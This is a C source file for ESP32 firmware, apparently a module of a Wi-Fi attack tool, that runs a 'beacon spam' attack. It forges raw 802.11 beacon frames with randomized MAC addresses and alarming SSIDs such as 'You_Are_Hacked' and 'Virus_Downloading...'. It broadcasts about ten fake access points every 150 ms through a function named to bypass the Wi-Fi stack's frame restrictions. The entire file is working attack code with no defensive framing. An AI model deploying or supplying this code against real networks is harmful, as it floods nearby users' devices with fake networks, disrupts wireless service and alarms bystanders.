#include "attack_beaconspam.h"

#include <string.h>
#include <esp_random.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "attack.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "attack_beaconspam";
static esp_timer_handle_t spam_timer_handle;

// Typical beacon frame template
static uint8_t beacon_template[] = {
    // Frame Control: Beacon (0x80), Flags (0x00)
    0x80, 0x00,
    // Duration
    0x00, 0x00,
    // Destination address (Broadcast)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    // Source address (BSSID) - will be randomized
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // BSSID - will be randomized
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Sequence Control
    0x00, 0x00,
    // Timestamp (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Beacon Interval (100 TU)
    0x64, 0x00,
    // Capability Information
    0x01, 0x04,
    // SSID Tag (0), Length (variable), SSID string...
};

static const char *spam_names[] = {
    "Hacked_By_AirDoom",
    "Free_WiFi_Connect",
    "Virus_Downloading...",
    "FBI_Van_42",
    "You_Are_Hacked",
    "5G_Test_Mast_1000%",
    "No_Internet_For_You",
    "Searching_For_Passwords..."
};

static void timer_send_spam_frames(void *arg) {
    uint8_t frame[128];
    memcpy(frame, beacon_template, sizeof(beacon_template));
    
    // Create ~10 different fake APs per timer tick
    for(int i = 0; i < 10; i++) {
        // Randomize MAC address
        uint8_t mac[6];
        esp_fill_random(mac, 6);
        mac[0] &= 0xFE; // Unicast
        mac[0] |= 0x02; // Locally administered
        memcpy(&frame[10], mac, 6); // Source
        memcpy(&frame[16], mac, 6); // BSSID
        
        // Select random name
        const char *ssid = spam_names[esp_random() % (sizeof(spam_names)/sizeof(spam_names[0]))];
        // Format string with random number to force unique IDs on the target devices
        char unique_ssid[32];
        snprintf(unique_ssid, sizeof(unique_ssid), "%s_%04X", ssid, (unsigned int)(esp_random() % 0xFFFF));
        uint8_t ssid_len = strlen(unique_ssid);
        
        // Append SSID tag
        int offset = sizeof(beacon_template);
        frame[offset++] = 0x00; // Tag: SSID
        frame[offset++] = ssid_len;
        memcpy(&frame[offset], unique_ssid, ssid_len);
        offset += ssid_len;
        
        // Append Supported Rates (1, 2, 5.5, 11 Mbps)
        frame[offset++] = 0x01; // Tag: Supported Rates
        frame[offset++] = 0x04; // Length
        frame[offset++] = 0x82; frame[offset++] = 0x84; frame[offset++] = 0x8b; frame[offset++] = 0x96;
        
        // Append DS Parameter set (Channel 1)
        frame[offset++] = 0x03; // Tag: DS Parameter
        frame[offset++] = 0x01;
        frame[offset++] = 0x01; // Channel 1
        
        wsl_bypasser_send_raw_frame(frame, offset);
    }
}

void attack_beaconspam_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting Beacon Spam attack...");
    
    // Start AP mode if not started so TX works
    wifictl_mgmt_ap_start();
    
    const esp_timer_create_args_t spam_timer_args = {
        .callback = &timer_send_spam_frames,
    };
    ESP_ERROR_CHECK(esp_timer_create(&spam_timer_args, &spam_timer_handle));
    
    // Slowed down generation so the tx buffers don't overflow while keeping the number high
    ESP_ERROR_CHECK(esp_timer_start_periodic(spam_timer_handle, 150000));
}

void attack_beaconspam_stop() {
    ESP_LOGI(TAG, "Stopping Beacon Spam attack...");
    esp_err_t err = esp_timer_stop(spam_timer_handle);
    if(err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "Timer stop error: %d", err);
    }
    esp_timer_delete(spam_timer_handle);
    ESP_LOGI(TAG, "Beacon Spam stopped");
}
